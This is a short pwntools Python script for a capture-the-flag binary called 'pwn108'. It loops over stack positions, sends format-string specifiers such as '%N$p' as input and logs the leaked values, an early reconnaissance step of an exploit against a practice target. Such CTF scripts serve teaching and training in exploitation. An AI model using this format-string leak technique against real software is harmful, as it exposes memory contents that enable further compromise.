from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)
# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())
# Set up pwntools for the correct architecture
exe = './pwn108.pwn108'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = 'info'
# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

for i in range(1,100):
    try:
        io = start()
        io.sendline('a')
        io.sendlineafter(b'=[Your Reg No]: ', '%{}$p'.format(i).encode())
        io.recvuntil(b'Register no  : ')
        result = io.recv(14).strip()
        log.info(str(i) + ": " + str(result))
        # leak_char = result.ljust(8,b"\x00")        
        # print(str(i) + ': ' + str(leak_char).strip())
        io.close()
    except EOFError:
        pass